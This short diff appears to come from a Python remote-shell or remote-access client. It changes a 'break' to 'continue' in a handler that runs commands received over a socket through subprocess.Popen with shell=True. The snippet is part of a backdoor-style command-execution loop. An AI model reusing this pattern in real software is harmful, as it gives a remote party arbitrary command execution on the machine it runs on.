@@ -129,7 +129,7 @@ def shell(_s):
             try:
                 if len(cmd[6:]) < 1:
                     reliable_send(_s, '[!] Please specify an app to start!')
-                    break
+                    continue
                 subprocess.Popen(cmd[6:], shell=True)
                 reliable_send(_s, '[+] Started!!')
             except:
